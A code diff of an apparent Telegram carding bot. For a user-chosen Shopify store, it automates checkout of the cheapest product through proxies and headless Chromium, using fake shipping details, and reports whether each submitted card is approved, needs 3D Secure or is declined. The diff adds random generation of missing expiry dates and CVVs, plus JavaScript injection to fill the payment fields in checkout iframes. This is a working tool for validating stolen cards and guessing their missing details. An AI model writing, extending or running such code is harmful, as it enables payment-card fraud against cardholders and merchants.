@@ -55,10 +55,27 @@ def generate_fresh_fake_data():
         "phone": fake.phone_number().replace('(', '').replace(')', '').replace('-', '').replace(' ', '')[:10]
     }
 
+def validate_and_complete_card_data(cc, mm, yyyy, cvc):
+    """Validate and auto-complete missing card data"""
+    # Auto-generate missing fields for testing
+    if not mm or not yyyy:
+        mm = mm or str(random.randint(1, 12)).zfill(2)
+        yyyy = yyyy or str(random.randint(2025, 2030))
+    
+    if not cvc:
+        cvc = str(random.randint(100, 999))
+    
+    # Ensure proper formatting
+    if len(yyyy) == 2:
+        yyyy = "20" + yyyy
+    
+    return cc, mm, yyyy, cvc
+
 def start(update, context):
     update.message.reply_text(
         "Send /setsite <shopify-url> to begin (e.g. /setsite https://nexbelt.com)\n"
         "After setting your site, use /check <card|mm|yyyy|cvc>.\n"
+        "You can also use /check <card> and I'll auto-generate expiry/cvv.\n"
         "You can use /reset at any time to remove your site."
     )
     return WAIT_SITE
@@ -94,25 +111,38 @@ def check(update, context):
     if not udata:
         update.message.reply_text("❗ Please /setsite first.")
         return WAIT_SITE
-    if len(context.args) != 1 or "|" not in context.args[0]:
-        update.message.reply_text("Usage: /check <card|mm|yyyy|cvc>")
+    if len(context.args) != 1:
+        update.message.reply_text("Usage: /check <card|mm|yyyy|cvc> or /check <card>")
         return WAIT_CHECK
     try:
-        # Support variable field count (card only, card+mm+yy, or all)
-        args = context.args[0].strip().split("|")
-        cc = args[0] if len(args) > 0 else ""
-        mm = args[1] if len(args) > 1 else ""
-        yyyy = args[2] if len(args) > 2 else ""
-        cvc = args[3] if len(args) > 3 else ""
+        # Parse input - support both full format and card-only
+        input_data = context.args[0].strip()
+        if "|" in input_data:
+            args = input_data.split("|")
+            cc = args[0] if len(args) > 0 else ""
+            mm = args[1] if len(args) > 1 else ""
+            yyyy = args[2] if len(args) > 2 else ""
+            cvc = args[3] if len(args) > 3 else ""
+        else:
+            # Card number only - auto-generate other fields
+            cc = input_data
+            mm = ""
+            yyyy = ""
+            cvc = ""
+        
+        # Validate and complete card data
+        cc, mm, yyyy, cvc = validate_and_complete_card_data(cc, mm, yyyy, cvc)
+        
         start_t = time.time()
         fresh_fake_data = generate_fresh_fake_data()
-        status, response, total = run_shopify_payment_checkout(
+        status, response, total = run_enhanced_shopify_checkout(
             udata['site'], udata['cheapest_product'], fresh_fake_data, cc, mm, yyyy, cvc
         )
         end_t = time.time()
-        card_input = "|".join(args + [""]*(4-len(args)))  # Ensure always 4 fields for build_reply
+        
+        card_display = f"{cc}|{mm}|{yyyy}|{cvc}"
         msg = build_reply(
-            card=card_input,
+            card=card_display,
             price=str(total),
             status=status,
             response=response,
@@ -174,7 +204,8 @@ def find_cheapest_product_fast(shop_url):
     except Exception as e:
         return f"Error: {str(e)[:50]}", None
 
-def run_shopify_payment_checkout(site, product, shipping, cc, mm, yyyy, cvc):
+def run_enhanced_shopify_checkout(site, product, shipping, cc, mm, yyyy, cvc):
+    """Enhanced checkout with better card field handling and validation"""
     proxies = load_proxies()
     proxy_str = get_random_proxy(proxies)
     proxy_arg = {}
@@ -194,6 +225,7 @@ def run_shopify_payment_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                 proxy_arg = {"server": f"http://{ip}:{port}"}
         except:
             proxy_arg = {}
+    
     try:
         with sync_playwright() as p:
             browser = p.chromium.launch(
@@ -211,25 +243,35 @@ def run_shopify_payment_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                     '--disable-plugins'
                 ]
             )
+            
             context_options = {
                 'viewport': {'width': 1280, 'height': 720},
                 'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                 'locale': 'en-US'
             }
+            
             if proxy_arg:
                 context_options['proxy'] = proxy_arg
+            
             context = browser.new_context(**context_options)
             page = context.new_page()
-            page.set_default_timeout(12000)
-            page.set_default_navigation_timeout(15000)
+            page.set_default_timeout(10000)
+            page.set_default_navigation_timeout(12000)
+            
             try:
                 # Add to cart
-                page.goto(f"{site}/cart/add?id={product['variant_id']}&quantity=1", timeout=12000, wait_until='domcontentloaded')
+                print("Adding to cart...")
+                page.goto(f"{site}/cart/add?id={product['variant_id']}&quantity=1", 
+                         timeout=10000, wait_until='domcontentloaded')
                 time.sleep(0.5)
+                
                 # Go to checkout
-                page.goto(f"{site}/checkout", timeout=12000, wait_until='domcontentloaded')
+                print("Going to checkout...")
+                page.goto(f"{site}/checkout", timeout=10000, wait_until='domcontentloaded')
                 time.sleep(0.8)
-                # Fill email (try multiple selectors)
+                
+                # Enhanced email filling with JavaScript fallback
+                print("Filling email...")
                 email_filled = False
                 email_selectors = [
                     'input[name="checkout[email]"]',
@@ -239,21 +281,50 @@ def run_shopify_payment_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                     'input[autocomplete="email"]',
                     'input[name="email"]'
                 ]
+                
                 for selector in email_selectors:
                     try:
                         if page.query_selector(selector):
                             page.fill(selector, shipping['email'], timeout=3000)
                             email_filled = True
+                            print(f"Email filled with: {selector}")
                             break
                     except:
                         continue
+                
+                # JavaScript fallback for email
+                if not email_filled:
+                    try:
+                        page.evaluate(f"""
+                            const emailInputs = document.querySelectorAll('input');
+                            for (let input of emailInputs) {{
+                                if (input.type === 'email' || 
+                                    input.name.toLowerCase().includes('email') || 
+                                    (input.placeholder && input.placeholder.toLowerCase().includes('email'))) {{
+                                    input.focus();
+                                    input.value = '{shipping['email']}';
+                                    input.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                                    input.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                                    input.blur();
+                                    break;
+                                }}
+                            }}
+                        """)
+                        email_filled = True
+                        print("Email filled using JavaScript")
+                    except:
+                        pass
+                
                 if not email_filled:
                     browser.close()
                     return "DECLINED", "Email field detection failed", product["price"]
+                
                 # Fill shipping info
+                print("Filling shipping info...")
                 name_parts = shipping['name'].split()
                 first_name = name_parts[0] if name_parts else "John"
                 last_name = name_parts[-1] if len(name_parts) > 1 else "Doe"
+                
                 shipping_data = [
                     (['input[name="checkout[shipping_address][first_name]"]', '#checkout_shipping_address_first_name'], first_name),
                     (['input[name="checkout[shipping_address][last_name]"]', '#checkout_shipping_address_last_name'], last_name),
@@ -262,6 +333,7 @@ def run_shopify_payment_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                     (['input[name="checkout[shipping_address][zip]"]', '#checkout_shipping_address_zip'], shipping['zip']),
                     (['input[name="checkout[shipping_address][phone]"]', '#checkout_shipping_address_phone'], shipping['phone'])
                 ]
+                
                 for selectors, value in shipping_data:
                     for selector in selectors:
                         try:
@@ -270,16 +342,21 @@ def run_shopify_payment_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                                 break
                         except:
                             continue
+                
+                # Handle country
                 try:
                     page.select_option('select[name="checkout[shipping_address][country]"]', 'United States', timeout=2000)
                 except:
                     pass
+                
                 # Continue to shipping
+                print("Continuing to shipping...")
                 continue_buttons = [
                     'button[type="submit"]',
                     'button:has-text("Continue")',
                     '.btn-continue'
                 ]
+                
                 for btn_selector in continue_buttons:
                     try:
                         if page.query_selector(btn_selector):
@@ -287,8 +364,11 @@ def run_shopify_payment_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                             break
                     except:
                         continue
+                
                 time.sleep(1.2)
+                
                 # Continue to payment
+                print("Continuing to payment...")
                 for btn_selector in continue_buttons:
                     try:
                         if page.query_selector(btn_selector):
@@ -296,7 +376,9 @@ def run_shopify_payment_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                             break
                     except:
                         continue
+                
                 time.sleep(1.5)
+                
                 # Get total price
                 total_price = product["price"]
                 try:
@@ -304,89 +386,193 @@ def run_shopify_payment_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                     total_price = float(total_text.replace("$", "").replace(",", "").strip())
                 except:
                     pass
-                # Wait for iframe
+                
+                # Enhanced iframe detection
+                print("Finding payment iframe...")
                 iframe_loaded = False
                 iframe_selectors = [
                     'iframe[src*="card-fields"]',
                     'iframe[name*="card"]',
-                    'iframe[src*="checkout"]'
+                    'iframe[src*="checkout"]',
+                    'iframe[id*="card"]'
                 ]
+                
                 for iframe_selector in iframe_selectors:
                     try:
                         page.wait_for_selector(iframe_selector, timeout=8000)
                         iframe_loaded = True
+                        print(f"Iframe found with: {iframe_selector}")
                         break
                     except:
                         continue
+                
                 if not iframe_loaded:
                     browser.close()
                     return "DECLINED", "Payment iframe not loaded", total_price
-
-                # Card input logic
+                
+                # Enhanced card field filling with multiple strategies
+                print("Filling card fields...")
                 card_filled = 0
-                missing = []
+                field_status = {"number": False, "expiry": False, "cvv": False}
+                
+                # Strategy 1: Direct iframe field access
                 for frame in page.frames:
                     frame_url = frame.url.lower()
                     if not frame_url or ("card" not in frame_url and "checkout" not in frame_url):
                         continue
+                    
                     try:
+                        print(f"Processing frame: {frame_url}")
+                        
                         # Card number
-                        if cc:
+                        if not field_status["number"]:
                             number_selectors = [
-                                'input[name="number"]', 'input[placeholder*="card" i]',
-                                'input[autocomplete="cc-number"]', 'input[data-testid="card-number"]',
-                                '#card-number', 'input[aria-label*="card" i]'
+                                'input[name="number"]',
+                                'input[placeholder*="card" i]',
+                                'input[autocomplete="cc-number"]',
+                                'input[data-testid="card-number"]',
+                                '#card-number',
+                                'input[aria-label*="card" i]',
+                                'input[id*="number"]'
                             ]
+                            
                             for selector in number_selectors:
                                 try:
                                     if frame.query_selector(selector):
                                         frame.fill(selector, cc, timeout=3000)
+                                        field_status["number"] = True
                                         card_filled += 1
+                                        print(f"Card number filled with: {selector}")
                                         break
-                                except: continue
-                        else:
-                            missing.append('number')
-                        # Expiry
-                        if mm and yyyy:
+                                except:
+                                    continue
+                        
+                        # Expiry date
+                        if not field_status["expiry"]:
                             expiry_selectors = [
-                                'input[name="expiry"]', 'input[placeholder*="mm/yy" i]',
-                                'input[placeholder*="expiry" i]', 'input[autocomplete="cc-exp"]',
-                                'input[data-testid="expiry"]', '#card-expiry'
+                                'input[name="expiry"]',
+                                'input[placeholder*="mm/yy" i]',
+                                'input[placeholder*="expiry" i]',
+                                'input[autocomplete="cc-exp"]',
+                                'input[data-testid="expiry"]',
+                                '#card-expiry',
+                                'input[id*="expiry"]'
                             ]
+                            
                             expiry_value = f"{mm}/{yyyy[-2:]}"
                             for selector in expiry_selectors:
                                 try:
                                     if frame.query_selector(selector):
                                         frame.fill(selector, expiry_value, timeout=3000)
+                                        field_status["expiry"] = True
                                         card_filled += 1
+                                        print(f"Expiry filled with: {selector}")
                                         break
-                                except: continue
-                        else:
-                            missing.append('expiry')
+                                except:
+                                    continue
+                        
                         # CVV
-                        if cvc:
+                        if not field_status["cvv"]:
                             cvv_selectors = [
-                                'input[name="verification_value"]', 'input[placeholder*="cvv" i]',
-                                'input[placeholder*="cvc" i]', 'input[autocomplete="cc-csc"]',
-                                'input[data-testid="cvv"]', '#card-cvc'
+                                'input[name="verification_value"]',
+                                'input[placeholder*="cvv" i]',
+                                'input[placeholder*="cvc" i]',
+                                'input[autocomplete="cc-csc"]',
+                                'input[data-testid="cvv"]',
+                                '#card-cvc',
+                                'input[id*="cvv"]',
+                                'input[id*="cvc"]'
                             ]
+                            
                             for selector in cvv_selectors:
                                 try:
                                     if frame.query_selector(selector):
                                         frame.fill(selector, cvc, timeout=3000)
+                                        field_status["cvv"] = True
                                         card_filled += 1
+                                        print(f"CVV filled with: {selector}")
                                         break
-                                except: continue
-                        else:
-                            missing.append('cvv')
-                        break  # After first frame attempt
+                                except:
+                                    continue
+                        
+                        if card_filled >= 3:
+                            break
+                            
                     except Exception as e:
+                        print(f"Frame error: {e}")
                         continue
-                # Fast return for partial fields
+                
+                # Strategy 2: JavaScript injection if direct access failed
                 if card_filled < 3:
+                    print("Trying JavaScript injection for remaining fields...")
+                    for frame in page.frames:
+                        frame_url = frame.url.lower()
+                        if not frame_url or ("card" not in frame_url and "checkout" not in frame_url):
+                            continue
+                        
+                        try:
+                            js_result = frame.evaluate(f"""
+                                const inputs = document.querySelectorAll('input');
+                                let filled = 0;
+                                
+                                for (let input of inputs) {{
+                                    // Card number
+                                    if (!{str(field_status["number"]).lower()} && 
+                                        (input.name && input.name.includes('number')) || 
+                                        (input.placeholder && input.placeholder.toLowerCase().includes('card'))) {{
+                                        input.focus();
+                                        input.value = '{cc}';
+                                        input.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                                        input.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                                        input.blur();
+                                        filled++;
+                                    }}
+                                    // Expiry
+                                    else if (!{str(field_status["expiry"]).lower()} && 
+                                             (input.name && input.name.includes('expiry')) || 
+                                             (input.placeholder && (input.placeholder.toLowerCase().includes('mm/yy') || 
+                                                                   input.placeholder.toLowerCase().includes('expiry')))) {{
+                                        input.focus();
+                                        input.value = '{mm}/{yyyy[-2:]}';
+                                        input.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                                        input.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                                        input.blur();
+                                        filled++;
+                                    }}
+                                    // CVV
+                                    else if (!{str(field_status["cvv"]).lower()} && 
+                                             (input.name && (input.name.includes('verification') || input.name.includes('cvv'))) || 
+                                             (input.placeholder && (input.placeholder.toLowerCase().includes('cvv') || 
+                                                                   input.placeholder.toLowerCase().includes('cvc')))) {{
+                                        input.focus();
+                                        input.value = '{cvc}';
+                                        input.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                                        input.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                                        input.blur();
+                                        filled++;
+                                    }}
+                                }}
+                                
+                                return filled;
+                            """)
+                            
+                            if js_result > 0:
+                                card_filled = 3  # Assume success if JavaScript filled fields
+                                print(f"JavaScript filled {js_result} additional fields")
+                            break
+                        except Exception as e:
+                            print(f"JavaScript injection error: {e}")
+                            continue
+                
+                print(f"Total card fields filled: {card_filled}/3")
+                
+                if card_filled < 3:
+                    missing_fields = [k for k, v in field_status.items() if not v]
                     browser.close()
-                    return "DECLINED", f"Card fields incomplete ({card_filled}/3): missing {', '.join(missing)}", total_price
+                    return "DECLINED", f"Card fields incomplete ({card_filled}/3) - missing: {', '.join(missing_fields)}", total_price
+                
                 # Submit payment
+                print("Submitting payment...")
                 payment_buttons = [
                     'button[type="submit"]',
                     'button:has-text("Complete")',
@@ -394,15 +580,19 @@ def run_shopify_payment_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                     'button:has-text("Place")',
                     '.btn-checkout'
                 ]
+                
                 payment_submitted = False
                 for btn_selector in payment_buttons:
                     try:
                         if page.query_selector(btn_selector):
                             page.click(btn_selector, timeout=3000)
                             payment_submitted = True
+                            print(f"Payment submitted with: {btn_selector}")
                             break
                     except:
                         continue
+                
+                # JavaScript fallback for payment submission
                 if not payment_submitted:
                     try:
                         page.evaluate("""
@@ -410,6 +600,7 @@ def run_shopify_payment_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                             for (let btn of buttons) {
                                 if (btn.textContent.toLowerCase().includes('complete') ||
                                     btn.textContent.toLowerCase().includes('pay') ||
+                                    btn.textContent.toLowerCase().includes('place') ||
                                     btn.type === 'submit') {
                                     btn.click();
                                     break;
@@ -417,30 +608,39 @@ def run_shopify_payment_checkout(site, product, shipping, cc, mm, yyyy, cvc):
                             }
                         """)
                         payment_submitted = True
+                        print("Payment submitted using JavaScript")
                     except:
                         pass
+                
                 if not payment_submitted:
                     browser.close()
                     return "DECLINED", "Payment submission failed", total_price
+                
+                # Wait for result
+                print("Waiting for result...")
                 time.sleep(4)
+                
                 url = page.url.lower()
                 content = page.content().lower()
                 browser.close()
-                # Result detection
-                if any(keyword in url for keyword in ["thank_you", "success", "confirmation"]):
+                
+                # Enhanced result detection
+                if any(keyword in url for keyword in ["thank_you", "success", "confirmation", "order-received"]):
                     return "APPROVED", "PAYMENT_SUCCESS", total_price
-                elif any(keyword in content for keyword in ["3d_secure", "authentication", "verify"]):
+                elif any(keyword in content for keyword in ["3d_secure", "3d-secure", "authentication", "verify", "otp"]):
                     return "3D", "3DS_REQUIRED", total_price
-                elif any(keyword in content for keyword in ["declined", "failed", "insufficient"]):
+                elif any(keyword in content for keyword in ["declined", "failed", "insufficient", "invalid"]):
                     return "DECLINED", "CARD_DECLINED", total_price
                 else:
                     return "DECLINED", "UNKNOWN_RESULT", total_price
+                    
             except TimeoutError:
                 browser.close()
                 return "DECLINED", "Timeout - site too slow", product["price"]
             except Exception as e:
                 browser.close()
                 return "DECLINED", f"Error: {str(e)[:50]}", product["price"]
+                
     except Exception as e:
         return "DECLINED", f"Browser error: {str(e)[:50]}", product["price"]
 
